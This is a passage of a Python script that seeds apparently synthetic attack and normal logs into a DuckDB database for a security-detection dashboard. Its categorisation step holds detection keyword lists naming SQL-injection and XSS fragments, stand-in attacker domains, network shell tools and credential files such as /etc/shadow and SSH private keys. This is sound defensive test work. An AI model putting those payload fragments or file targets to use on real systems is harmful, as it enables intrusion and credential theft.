    print("  4. Behavioral Analysis (UEBA - unusual user behavior)")
    print("  5. Network Analysis (port scanning, DDoS, beaconing)")
    print("  6. Rule Engine (MITRE ATT&CK rules)")
    print("  7. Threat Intel Matching (blocked IPs, malicious domains/hashes)")
    print()
    print("⚠️  NOTE: DuckDB doesn't support concurrent writes.")
    print("   If API is running, you may see lock errors.")
    print("   Options:")
    print("   1. Stop API temporarily while seeding")
    print("   2. Seed when API is not running")
    print("   3. Seeder will retry automatically on lock conflicts")
    print()
    
    # Initialize schema on startup
    print("Initializing database schema and threat intel...")
    try:
        conn = connect_db()
        conn.close()
        print("✓ Database schema initialized")
        print("✓ Threat intel indicators loaded")
    except Exception as e:
        print(f"⚠️  Could not initialize schema: {e}")
        print("   Continuing anyway - schema may already exist")
    print()
    
    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=duration_minutes)
    
    attack_count = 0
    normal_count = 0
    method_counts = {
        "signature": 0,
        "threat_intel": 0,
        "heuristic": 0,
        "behavioral": 0,
        "network": 0,
        "anomaly": 0,
        "rule_engine": 0,
        "normal": 0
    }
    
    try:
        while datetime.now() < end_time:
            # Open connection for this batch
            conn = None
            try:
                conn = connect_db()
                
                logs = []
                
                for _ in range(batch_size):
                    log = generate_log()
                    logs.append(log)
                    
                    # Categorize log
                    message_lower = log["message"].lower()
                    
                    # Parse normalized field if it's a JSON string
                    normalized = {}
                    if log.get("normalized"):
                        if isinstance(log["normalized"], str):
                            try:
                                normalized = json.loads(log["normalized"])
                            except:
                                normalized = {}
                        else:
                            normalized = log["normalized"]
                    
                    if any(x in message_lower for x in ["or 1=1", "union select", "script>", "etc/passwd", "drop table"]):
                        method_counts["signature"] += 1
                        attack_count += 1
                    elif any(x in message_lower for x in ["blocked ip", "evil.com", "malware.net", "phishing.org", "c2-server.com", "attacker.io"]):
                        method_counts["threat_intel"] += 1
                        attack_count += 1
                    elif any(x in message_lower for x in ["failed password", "sudo", "rm -rf", "chmod 777", "wget", "curl", "netcat"]):
                        method_counts["heuristic"] += 1
                        attack_count += 1
                    elif "unusual" in message_lower or normalized.get("resource") in ["/etc/shadow", "/root/.ssh/id_rsa", "/var/log/auth.log", "/etc/passwd"]:
                        method_counts["behavioral"] += 1
                        attack_count += 1
                    elif any(x in message_lower for x in ["ufw block", "dns query", "beacon", "ddos"]) or normalized.get("dest_port"):
                        method_counts["network"] += 1
                        attack_count += 1
                    elif "failed" in message_lower and "password" in message_lower:
                        method_counts["anomaly"] += 1
                        attack_count += 1
                    elif normalized.get("user_type") == "privileged" or "c2" in message_lower or normalized.get("dest_port") in [8080, 8443, 4444]:
                        method_counts["rule_engine"] += 1
                        attack_count += 1
                    else:
                        method_counts["normal"] += 1
                        normal_count += 1
                
                # Prepare data for insertion
                data = []
                for log in logs:
                    data.append((
                        log["id"], log["timestamp"], log["raw"], log["appname"], 
                        log["file"], log["host"], log["hostname"], log["message"], 
                        log["procid"], log["source_type"], log["normalized"], 
                        log["metadata"], log["ingestion_time"]
                    ))
                
                # Insert batch
                placeholders = "(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                conn.executemany(f"""
                    INSERT INTO logs (
                        id, timestamp, raw, appname, file, host, hostname, 
                        message, procid, source_type, normalized, metadata, ingestion_time
                    ) VALUES {placeholders}
                """, data)
                
                elapsed = (datetime.now() - start_time).total_seconds() / 60
                remaining = duration_minutes - elapsed
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Batch: {batch_size} logs | "
                      f"Elapsed: {elapsed:.1f}m | Remaining: {remaining:.1f}m | "
                      f"Total: {attack_count} attacks, {normal_count} normal")
                
            except Exception as e:
                if "lock" in str(e).lower() or "conflicting" in str(e).lower():
                    print(f"\n⚠️  Database lock detected. Waiting for API to release lock...")
                    time.sleep(2)  # Wait before retrying
                    continue  # Skip this batch and retry
                else:
                    print(f"\n❌ Error inserting logs: {e}")
                    raise
            finally:
                # Always close connection after each batch
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\nStopping seeder...")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n" + "="*60)
        print("SEEDING COMPLETE - Summary")
        print("="*60)
        print(f"Total logs generated: {attack_count + normal_count}")
        print(f"  - Attack/Suspicious logs: {attack_count}")
        print(f"  - Normal logs: {normal_count}")
        print("\nDetection method distribution:")
        for method, count in method_counts.items():
            percentage = (count / (attack_count + normal_count) * 100) if (attack_count + normal_count) > 0 else 0
            print(f"  - {method.replace('_', ' ').title()}: {count} ({percentage:.1f}%)")
        print("\n✓ All detection methods should have generated alerts")
        print("✓ Check the dashboard and alerts page to see results")
        print("="*60)


if __name__ == "__main__":
    # Optional arguments: batch_size, interval, duration_minutes
    batch_size = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    interval = float(sys.argv[2]) if len(sys.argv) > 2 else 1.0
    duration_minutes = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    seed_logs(batch_size, interval, duration_minutes)
